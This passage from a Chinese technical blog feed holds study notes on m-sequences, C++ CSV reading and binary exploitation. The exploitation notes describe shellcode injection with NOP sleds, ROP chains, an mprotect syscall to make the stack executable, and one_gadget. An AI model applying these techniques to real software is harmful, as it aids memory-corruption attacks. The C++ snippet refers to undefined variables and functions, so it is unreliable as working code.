src="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201121120755680.png" class="lazyload" data-srcset="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201121120755680.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201121120755680"></p><p><img src="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201121122525589.png" class="lazyload" data-srcset="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201121122525589.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201121122525589"></p><p><img src="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201124151103332.png" class="lazyload" data-srcset="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201124151103332.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201124151103332"></p><h1 id="m序列的伪随机性"><a href="#m序列的伪随机性" class="headerlink" title="m序列的伪随机性"></a>m序列的伪随机性</h1><p><img src="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201124153634751.png" class="lazyload" data-srcset="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201124153634751.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201124153634751"></p><p><img src="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201124153955017.png" class="lazyload" data-srcset="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201124153955017.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201124153955017"></p><p><img src="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201124154115137.png" class="lazyload" data-srcset="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201124154115137.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201124154115137"></p><p><img src="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201124154138583.png" class="lazyload" data-srcset="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201124154138583.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201124154138583"></p><p><img src="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201124154217478.png" class="lazyload" data-srcset="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201124154217478.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201124154217478"></p><p><img src="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201124154406932.png" class="lazyload" data-srcset="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201124154406932.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201124154406932"></p><h1 id="m序列的安全性"><a href="#m序列的安全性" class="headerlink" title="m序列的安全性"></a>m序列的安全性</h1><p><img src="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201124155103789.png" class="lazyload" data-srcset="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201124155103789.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201124155103789"></p><p><img src="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201124155131609.png" class="lazyload" data-srcset="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201124155131609.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201124155131609"></p><p><img src="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201124155307567.png" class="lazyload" data-srcset="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201124155307567.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201124155307567"></p><p><img src="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201124155358100.png" class="lazyload" data-srcset="/2020/11/14/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%AF%86%E7%A0%81%E5%AD%A6-m%E5%BA%8F%E5%88%97%E4%BA%A7%E7%94%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%80%A7%E8%B4%A8/image-20201124155358100.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201124155358100"></p>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>c++文件流的读写</title>
      <link href="/2020/11/07/C%E3%80%81C++/c++%E6%96%87%E4%BB%B6%E6%B5%81%E7%9A%84%E8%AF%BB%E5%86%99/"/>
      <url>/2020/11/07/C%E3%80%81C++/c++%E6%96%87%E4%BB%B6%E6%B5%81%E7%9A%84%E8%AF%BB%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h1 id="从csv文件读入小数"><a href="#从csv文件读入小数" class="headerlink" title="从csv文件读入小数"></a>从csv文件读入小数</h1><p>源码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    fstream r_in;</span><br><span class="line">    r_in.<span class="built_in">open</span>(<span class="string">&quot;matrix_r.csv&quot;</span>,ios::in);</span><br><span class="line">    <span class="keyword">if</span>(!r_in)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;打开matrix_r.csv文件出错&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    string s;</span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt; strarry;</span><br><span class="line">    <span class="keyword">int</span> r_count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">getline</span>(in,s))</span><br><span class="line">    &#123;   </span><br><span class="line">        <span class="function">stringstream <span class="title">ss</span><span class="params">(s)</span></span>;</span><br><span class="line">        string str;</span><br><span class="line">        vector&lt;string&gt; linearry;</span><br><span class="line">        <span class="keyword">while</span>(<span class="built_in">getline</span>(ss,str,<span class="string">&#x27;,&#x27;</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            linearry.<span class="built_in">push_back</span>(str);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    r_count++;</span><br><span class="line">    strarry.<span class="built_in">push_back</span>(linearry);</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;row;i++)&#123;</span><br><span class="line">         <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;cow;j++)&#123;</span><br><span class="line">                cout&lt;&lt;stringToNum&lt;<span class="keyword">float</span>&gt;(strarry[i][j])&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">         &#125;</span><br><span class="line">          cout&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C、C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn-程序内存布局</title>
      <link href="/2020/10/30/Pwn/Pwn-%E7%A8%8B%E5%BA%8F%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80/"/>
      <url>/2020/10/30/Pwn/Pwn-%E7%A8%8B%E5%BA%8F%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80/</url>
      
        <content type="html"><![CDATA[<p>程序启动时，加载器会将程序文件数据加载到内存里，在运行过程中，程序也会开辟部分动态内存。在程序运行的生命周期中，内存中比较重要的四部分数据是程序数据、堆、库数据、栈。另外，内核空间也会映射到程序内存中。</p><p>程序数据一般映射在内存的较低地址处，然后依次为堆数据、库数据及栈等，其中还映射一部分起保护作用的不可访问区域</p><p><img src="/2020/10/30/Pwn/Pwn-%E7%A8%8B%E5%BA%8F%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80/image-20201030193035277.png" class="lazyload" data-srcset="/2020/10/30/Pwn/Pwn-%E7%A8%8B%E5%BA%8F%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80/image-20201030193035277.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201030193035277"></p><h1 id="Proc程序数据"><a href="#Proc程序数据" class="headerlink" title="Proc程序数据"></a>Proc程序数据</h1><h2 id="代码段、数据段、BSS段"><a href="#代码段、数据段、BSS段" class="headerlink" title="代码段、数据段、BSS段"></a>代码段、数据段、BSS段</h2><p>程序数据主要包含三部分，其中<strong>代码段（Text段）</strong>主要用来存放可执行文件的代码指令，是可执行程序在内存中的镜像，代码段一般是只读的；<strong>数据段</strong>则用来存放可执行文件中已经初始化的变量，包含静态分配的变量和全局变量等；<strong>BSS段</strong>主要函数程序中未初始化的全局变量，在内存中BSS段全部</p><h1 id="Heap堆"><a href="#Heap堆" class="headerlink" title="Heap堆"></a>Heap堆</h1><p>堆主要用于存放进程运行过程中动态申请的内存段。进程调用malloc、alloca、new等函数来申请内存，利用free、delete等函数释放内存。这部分的大小不固定，以方便程序灵活使用内存。</p><h1 id="Memory-Mapping库数据"><a href="#Memory-Mapping库数据" class="headerlink" title="Memory Mapping库数据"></a>Memory Mapping库数据</h1><p>这部分数据很多是映射的系统库文件，其中比较重要的是libc库，很多程序所使用的系统函数都会动态地链接到libc库中去。</p><h1 id="Stack栈"><a href="#Stack栈" class="headerlink" title="Stack栈"></a>Stack栈</h1><p>栈存放程序临时创建的局部变量，包括函数内部的临时变量和调用函数时压入的参数。由于栈具有后进先出的特点，因此可以很方便地用来保存和恢复函数调用现场。</p><p><img src="/2020/10/30/Pwn/Pwn-%E7%A8%8B%E5%BA%8F%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80/image-20201030194557970.png" class="lazyload" data-srcset="/2020/10/30/Pwn/Pwn-%E7%A8%8B%E5%BA%8F%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80/image-20201030194557970.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201030194557970"></p><p><img src="/2020/10/30/Pwn/Pwn-%E7%A8%8B%E5%BA%8F%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80/image-20201030194604058.png" class="lazyload" data-srcset="/2020/10/30/Pwn/Pwn-%E7%A8%8B%E5%BA%8F%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80/image-20201030194604058.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201030194604058"></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn-常见利用方法</title>
      <link href="/2020/10/30/Pwn/Pwn-%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/"/>
      <url>/2020/10/30/Pwn/Pwn-%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Shellcode"><a href="#Shellcode" class="headerlink" title="Shellcode"></a>Shellcode</h1><p> 一般指获取shell代码，针对数据未开启可执行保护NX，可以将shellcode直接布置在堆栈等可写可执行区域保护NX，可以将shellcode直接布置在堆栈等可写可执行区域，然后劫持控制流，跳转过去即可。另外，可以通过其他手段如（rop）将数据区的NX关闭（mprotect设置页属性），或者将代码部分的也属性设置为可写，并在这里布置shellcode，然后执行shellcode。</p><p>payload: padding1+address of shellcode +padding2+shellcoede<img src="/2020/10/30/Pwn/Pwn-%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/image-20201103205234868.png" class="lazyload" data-srcset="/2020/10/30/Pwn/Pwn-%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/image-20201103205234868.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201103205234868"></p><p><strong>address of shellcode</strong>是后面shellcode起始处的地址，用来覆盖返回地址。</p><p><strong>shellcode</strong>应该为十六进制的机器码的格式</p><p><strong>shellcode</strong>起始地址：在padding2里填充若干长度的“\x90”，这个机器码对应的指令是NOP，也就是告诉CPU什么也不做，然后跳到吓一跳指令，有了这一段NOP的填充，只要返回地址能够命中这一段的任意位置，都可以副作用跳到shellcode，这种方法被成为<strong>“NOP Sled”</strong></p><p>这个方法的前提是系统关闭了NX以及</p><h1 id="rop-Return-Oriented-Programming"><a href="#rop-Return-Oriented-Programming" class="headerlink" title="rop(Return Oriented Programming)"></a>rop(Return Oriented Programming)</h1><p>修改放回地址，让其指向内存中已有的一段指令</p><p>rop即放回地址导向编程，通常是利用动态链接库和可执行文件中可利用指令片段（gadget），这些指令片段均以ret指令结尾，即用ret指令可以实现指令片段执行流的衔接，一般针对程序开启了NX属性，但可以控制栈上数据的情况，利用栈结构中的返回地址可以实现控制流的构造。</p><p><img src="/2020/10/30/Pwn/Pwn-%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/image-20201030190941336.png" class="lazyload" data-srcset="/2020/10/30/Pwn/Pwn-%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/image-20201030190941336.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201030190941336"></p><p>执行完gadget1，通过ret返回，进入gadget2，从而使得所有的gadget得到有序执行，为了简化rop实现，很多时候有很多libc库函数可以直接利用，从而出现了ret2libc。</p><p><img src="/2020/10/30/Pwn/Pwn-%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/image-20201030191121152.png" class="lazyload" data-srcset="/2020/10/30/Pwn/Pwn-%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/image-20201030191121152.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201030191121152"></p><p><img src="/2020/10/30/Pwn/Pwn-%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/image-20201030191127051.png" class="lazyload" data-srcset="/2020/10/30/Pwn/Pwn-%E5%B8%B8%E8%A7%81%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/image-20201030191127051.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20201030191127051"></p><p>其中，func_ptr是一些要调用的函数的地址，而arg1、arg2等等则是该函数所需要的参数，p_ret是游一些pop ret的gadget地址，gadget的形式如pop eax、pop ebx、ret。pop的个数和参数保持一致。rop的原理和函数栈的实现机制有关，其他架构系统可根据函数调用的传递规则来具体构造。</p><p>ROP常见的拼凑效果是实现一次系统调用，Linux系统下对应的汇编指令是<code>int 0x80</code>，执行这条指令时，被调用函数的编号存入eax，调用参数应按顺序存入ebx，ecx，edx，esi，edi中。</p><p>例如：编号125对应函数mprotect（void &amp;addr,size_t len,int prot），可用该函数将栈的属性改为可执行，这样就可以使用shellcode了。假如利用系统调用执行这个函数，<strong>eax</strong>、<strong>ebx</strong>，<strong>ecx</strong>、<strong>edx</strong>应该分别为“<strong>125“</strong>、<strong>内存栈的分段地址（可以通过调试工具确定）</strong>、**”0x10000“(需要修改的空间长度，也许需要更长)<strong>、</strong>”7“(RWX权限)**。</p><p>对于上面提到的mprotect函数，我们需要将参数传输到寄存器，所以可以用pop指令将栈顶数据弹如寄存器，如果在内存中能找到直接可用的数据，也可以用mov指令进行传输，不过写入数据再pop要比mov来的简单，如果要用pop指令来传输调用参数，就需要在溢出数据内包含这些参数，所以上面的溢出数据格式需要一点修改。</p><h1 id="Magic-Addr"><a href="#Magic-Addr" class="headerlink" title="Magic_Addr"></a>Magic_Addr</h1><p>Magic_Addr是指专门通过一个地址获取shell的地址，一般位于system函数的实现代码中的one_gadget。在libc的system函数中，有多出调用了execve(“/bin/sh”,”sh”,ebv)函数对应的反编译代码和反汇编代码。</p><p><img 